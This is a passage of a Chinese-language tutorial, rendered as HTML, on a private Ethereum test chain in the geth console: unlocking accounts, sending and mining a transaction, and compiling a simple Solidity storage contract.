role="presentation" style="padding-right: 0.1px;"><span class="cm-string">"0xe9db1b66197355d0f05534a53f6b7dcf0c873c76"</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 192px;"></div><div class="CodeMirror-gutters" style="display: none; height: 192px;"></div></div></div></pre><p>​<span>	</span>操作成功后，用户别名 user1、user2 已经成功赋值</p><ul><li>对账户进行解锁</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; personal.unlockAccount(user2, <span class="cm-string">'123'</span>)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Error: could not decrypt key with given passphrase</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; personal.unlockAccount(user2, <span class="cm-string">'123456'</span>)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">true</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 100px;"></div><div class="CodeMirror-gutters" style="display: none; height: 100px;"></div></div></div></pre><p>​<span>	</span>为了安全起见，一般一个用户在创建的时候都处于锁定状态，输入密码进行解锁。</p><p>​<span>	</span>如果不解锁，直接对用户操作，例如，对用户转账，则报错如下：</p><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; eth.sendTransaction({from:user1, to:user2, value:666})</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Error: authentication needed: password or unlock</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  at web3.js:3143:20</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  at web3.js:6347:15</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  at web3.js:5081:36</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  at &lt;anonymous&gt;:1:1</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 146px;"></div><div class="CodeMirror-gutters" style="display: none; height: 146px;"></div></div></div></pre><ul><li>检查账户余额</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; eth.getBalance(user1)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">1</span>.15792089237316195423570985008687907853269984665640564039457584007913129639927e<span class="cm-operator">+</span><span class="cm-number">77</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; eth.getBalance(user2)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">0</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 100px;"></div><div class="CodeMirror-gutters" style="display: none; height: 100px;"></div></div></div></pre><ul><li>转账</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; eth.sendTransaction({from:user1, to:user2, value:100})</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|16:58:43.662] Submitted transaction &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-def">fullhash</span><span class="cm-operator">=</span>0x4daf7f1fa1b7c8e8b0c5770fdeaf1d0945782027646399822dbf2a303b1adaaa <span class="cm-def">recipient</span><span class="cm-operator">=</span>0xE9DB1b66197355D0f05534A53F6B7DcF0c873c76</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">"0x4daf7f1fa1b7c8e8b0c5770fdeaf1d0945782027646399822dbf2a303b1adaaa"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; eth.getBalance(user2)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">0</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 169px;"></div><div class="CodeMirror-gutters" style="display: none; height: 169px;"></div></div></div></pre><p>​<span>	</span>转账之后，账户余额仍然没变。此时，需要启动挖矿使交易加入到区块链中。</p><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; miner.start()</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|16:58:52.395] Transaction pool price threshold updated <span class="cm-def">price</span><span class="cm-operator">=</span><span class="cm-number">1</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|16:58:52.395] Starting mining operation</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">null</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; INFO [07-25|16:58:52.396] Commit new mining work &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-def">number</span><span class="cm-operator">=</span><span class="cm-number">5</span> <span class="cm-def">txs</span><span class="cm-operator">=</span><span class="cm-number">1</span> <span class="cm-def">uncles</span><span class="cm-operator">=</span><span class="cm-number">0</span> <span class="cm-def">elapsed</span><span class="cm-operator">=</span><span class="cm-number">648</span>.142µs</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|16:58:52.397] Successfully sealed new block &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-def">number</span><span class="cm-operator">=</span><span class="cm-number">5</span> <span class="cm-def">hash</span><span class="cm-operator">=</span>61063d…d19fce</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|16:58:52.398]  mined potential block &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-def">number</span><span class="cm-operator">=</span><span class="cm-number">5</span> <span class="cm-def">hash</span><span class="cm-operator">=</span>61063d…d19fce</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INFO [07-25|16:58:52.399] Commit new mining work &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-def">number</span><span class="cm-operator">=</span><span class="cm-number">6</span> <span class="cm-def">txs</span><span class="cm-operator">=</span><span class="cm-number">0</span> <span class="cm-def">uncles</span><span class="cm-operator">=</span><span class="cm-number">0</span> <span class="cm-def">elapsed</span><span class="cm-operator">=</span><span class="cm-number">995</span>.57µs</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">WARN [07-25|16:58:52.399] Block sealing failed &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-def">err</span><span class="cm-operator">=</span><span class="cm-string">"waiting for transactions"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; eth.getBalance(user2)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">100</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 353px;"></div><div class="CodeMirror-gutters" style="display: none; height: 353px;"></div></div></div></pre><ul><li>查看交易信息</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt; eth.getTransaction(<span class="cm-string">"0x4daf7f1fa1b7c8e8b0c5770fdeaf1d0945782027646399822dbf2a303b1adaaa"</span>)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  blockHash: <span class="cm-string">"0x61063d921d123682db18107038b813b198306ea7d14c0ff8a1b498e9c5d19fce"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  blockNumber: <span class="cm-number">5</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  from: <span class="cm-string">"0x04f14c835b74f79b7def175c4e481929f9800501"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  gas: <span class="cm-number">90000</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  gasPrice: <span class="cm-number">1</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  hash: <span class="cm-string">"0x4daf7f1fa1b7c8e8b0c5770fdeaf1d0945782027646399822dbf2a303b1adaaa"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  input: <span class="cm-string">"0x"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  nonce: <span class="cm-number">4</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  r: <span class="cm-string">"0xa812f2601212b123d8932c39b092a4fb46c3467ae51d17237a8034fba847fb73"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  s: <span class="cm-string">"0x21b01335a145ba67778b3ffc991f7c620dff19e693c748118b71537ac55ceb7a"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  to: <span class="cm-string">"0xe9db1b66197355d0f05534a53f6b7dcf0c873c76"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  transactionIndex: <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  v: <span class="cm-string">"0xa96"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  value: <span class="cm-number">100</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 399px;"></div><div class="CodeMirror-gutters" style="display: none; height: 399px;"></div></div></div></pre><h4><a name='header-n199' class='md-header-anchor '></a>合约</h4><ul><li>编写 Solidity 合约脚本</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="basic" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">pragma</span> <span class="cm-variable">solidity</span> <span class="cm-operator">^</span><span class="cm-number">0.4.11</span>;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">contract</span> <span class="cm-variable">Sample</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">uint</span> <span class="cm-keyword">public</span> <span class="cm-variable">value</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">constructor</span> (<span class="cm-variable">uint</span> <span class="cm-variable">v</span>) <span class="cm-keyword">public</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">value</span> = <span class="cm-variable">v</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-keyword">set</span>(<span class="cm-variable">uint</span> <span class="cm-variable">v</span>) <span class="cm-keyword">public</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">value</span> = <span class="cm-variable">v</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-keyword">get</span>() <span class="cm-keyword">public</span> <span class="cm-variable">view</span> <span class="cm-variable">returns</span> (<span class="cm-variable">uint</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">value</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 422px;"></div><div class="CodeMirror-gutters" style="display: none; height: 422px;"></div></div></div></pre><ul><li>编译脚本，生成 ABI 接口和合约的二进制代码</li></ul><blockquote><p>备注：利用 <a href='https://remix.ethereum.org'>Remix</a> 在线编译合约</p></blockquote><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="basic"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">root</span>:<span class="cm-variable">ethereum</span><span class="cm-error">#</span> <span class="cm-variable">solc</span> <span class="cm-operator">--</span><span class="cm-variable">optimize</span> <span class="cm-operator">--</span><span class="cm-variable">abi</span> <span class="cm-operator">--</span><span class="cm-variable">bin</span> <span class="cm-variable">sample.sol</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">======</span>= <span class="cm-variable">sample.sol</span>:<span class="cm-variable">Sample</span> <span class="cm-operator">======</span>=</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Binary</span>:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">608060405234801561001057600080</span><span class="cm-variable">fd5b50604051602080610114833981016040525160005560e1806100336000396000f30060806040526004361060525763ffffffff7c01000000000000000000000000000000000000000000000000000000006000350416633fa4f2458114605757806360fe47b114607b5780636d4ce63c146092575b600080fd5b348015606257600080fd5b50606960a4565b60408051918252519081900360200190f35b348015608657600080fd5b50609060043560aa565b005b348015609d57600080fd5b50606960af565b60005481565b600055565b600054905600a165627a7a723058207098d9dc5ae86fe75d1016078954658c002f112da516ed90f64c901feb340d870029</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Contract</span> <span class="cm-variable">JSON</span> <span class="cm-variable">ABI</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[{<span class="cm-string">"constant"</span>:<span class="cm-keyword">true</span>,<span class="cm-string">"inputs"</span>:[],<span class="cm-string">"name"</span>:<span class="cm-string">"value"</span>,<span class="cm-string">"outputs"</span>:[{<span class="cm-string">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string">"payable"</span>:<span class="cm-keyword">false</span>,<span class="cm-string">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string">"constant"</span>:<span class="cm-keyword">false</span>,<span class="cm-string">"inputs"</span>:[{<span class="cm-string">"name"</span>:<span class="cm-string">"v"</span>,<span class="cm-string">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string">"name"</span>:<span class="cm-string">"set"</span>,<span class="cm-string">"outputs"</span>:[],<span class="cm-string">"payable"</span>:<span class="cm-keyword">false</span>,<span class="cm-string">"stateMutability"</span>:<span class="cm-string">"nonpayable"</span>,<span class="cm-string">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string">"constant"</span>:<span class="cm-keyword">true</span>,<span class="cm-string">"inputs"</span>:[],<span class="cm-string">"name"</span>:<span class="cm-string">"get"</span>,<span class="cm-string">"outputs"</span>:[{<span class="cm-string">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string">"payable"</span>:<span class="cm-keyword">false</span>,<span class="cm-string">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string">"inputs"</span>:[{<span class="cm-string">"name"</span>:<span class="cm-string">"v"</span>,<span class="cm-string">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string">"payable"</span>:<span class="cm-keyword">false</span>,<span class="cm-string">"stateMutability"</span>:<span class="cm-string">"nonpayable"</span>,<span class="cm-string">"type"</span>:<span class="cm-string">"constructor"</span>}]</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 468px;"></div><div class="CodeMirror-gutters" style="display: none; height: 468px;"></div></div></div></pre><ul><li>定义合约</li></ul><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="basic" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;</span> <span class="cm-variable">abi</span> = [{<span class="cm-string">"constant"</span>:<span class="cm-keyword">true</span>,<span class="cm-string">"inputs"</span>:[],<span class="cm-string">"name"</span>:<span class="cm-string">"value"</span>,<span class="cm-string">"outputs"</span>:[{<span class="cm-string">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string">"type"</span>:<span class="cm-string">"uint256"</span>}],<span 